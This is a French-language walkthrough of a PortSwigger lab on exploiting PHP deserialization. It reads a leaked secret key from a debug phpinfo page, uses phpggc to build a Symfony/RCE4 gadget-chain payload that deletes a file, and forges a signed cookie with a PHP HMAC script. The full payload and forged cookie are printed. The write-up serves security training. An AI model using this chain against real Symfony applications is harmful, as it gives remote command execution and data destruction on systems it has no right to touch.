# Lab

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

## Solution

Sur ce lab, quand on se connece on a un cookie encodé en base64 qui correspond à :

```json
{
    "token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJndTR1OHJwZzloN3RxMHA3NDVya2M5ODk1dnV1ZW9hdSI7fQ==","sig_hmac_sha1":"1b604c638cfb990fe15b5596f7c1a48b9e338ff5"
}
```

On voit qu'il y a une signature `sig_hmac_sha1` qui est calculée à partir du contenu du cookie et d'une clé secrète.

Si on regarde le code source de la page d'accueil, il y a ce commentaire :

```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

Quand on va sur cette page, on tombe sur un `phpinfo()` qui nous montre une variable d'environnement : `SECRET_KEY	: v2nbiqrrqrouwccd07kvg8uyt7y9cf0o`

On la garde et on va l'utiliser après pour calculer la signature.

Avec l'outil (phpggc)[https://github.com/ambionics/phpggc] on peut générer un payload qui vas nous permettre d'exécuter une commande sur le serveur.

Mais d'abord, on doit trouver le framework utilisé ainsi que sa version. Pour cela, on a juste a modifier le cookie qui est encodé en base64 lors de notre connexion pour provoquer une erreur et on trouve : 

```html
<h4>Internal Server Error: Symfony Version: 4.3.6</h4>
<p class=is-warning>
    PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
    Stack trace:
        #0 {main}
        thrown in /var/www/index.php on line 7
</p>
```

Donc on liste les gadgets chain pour Symfony 4.3.6 :

```bash
$ ./phpggc -l Symfony

Gadget Chains
-------------

NAME             VERSION                                                 TYPE             VECTOR         I
Symfony/FD1      v3.2.7 <= v3.4.25 v4.0.0 <= v4.1.11 v4.2.0 <= v4.2.6    File delete      __destruct
Symfony/FW1      2.5.2                                                   File write       DebugImport    *
Symfony/FW2      3.4                                                     File write       __destruct
Symfony/RCE1     v3.1.0 <= v3.4.34                                       RCE: Command     __destruct     *
Symfony/RCE2     2.3.42 < 2.6                                            RCE: PHP Code    __destruct     *
Symfony/RCE3     2.6 <= 2.8.32                                           RCE: PHP Code    __destruct     *
Symfony/RCE4     3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE: Command     __destruct     *
Symfony/RCE5     5.2.*                                                   RCE: Command     __destruct
Symfony/RCE6     v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13       RCE: Command     __destruct     *
Symfony/RCE7     v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7    RCE: Command     __destruct
Symfony/RCE8     v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1                      RCE: Command     __destruct
Symfony/RCE9     2.6.0 <= 4.4.18                                         RCE: Command     __destruct
Symfony/RCE10    2.0.4 <= 5.4.24 (all)                                   RCE: Command     __toString
Symfony/RCE11    2.0.4 <= 5.4.24 (all)                                   RCE: Command     __destruct
```

Et on voit qu'il y a le gadget chain `Symfony/RCE4` qui correspond à notre version de Symfony (4.3.0-7).

On génére le payload qui va nous permettre d'exécuter la commande `rm /home/carlos/morale.txt` :

```bash
$ ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi
O319Cg==
```

Ensuite on a besoin de créer un cookie qui est signé avec la clé secrète `v2nbiqrrqrouwccd07kvg8uyt7y9cf0o`.

La signature HMAC fonctionne en utilisant une clé secrète pour calculer un hash d'un message. Ce hash est ensuite concaténé au message et envoyé au serveur. Le serveur peut alors recalculer le hash du message et vérifier qu'il correspond à celui qui a été envoyé.

L'agorithme est : `hash_hmac('sha1', $message, $secretKey)`

On peut utiliser ce script pour générer le cookie :

```php
<?php
    $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
    $secretKey = "v2nbiqrrqrouwccd07kvg8uyt7y9cf0o";
    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
    echo $cookie;
?>
```

Ce script peut être éxecuté en ligne avec l'outil (OnlinePHP)[https://onlinephp.io/], qui nous donne le resultat URL encodé :

```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%227238d8bdb4379103bf43c7c518fea63301243850%22%7D
```

Ensuite on a plus qu'a modifier le cookie avec le nouveau cookie encodé en base64 et on valide le lab en supprimant le fichier `morale.txt`.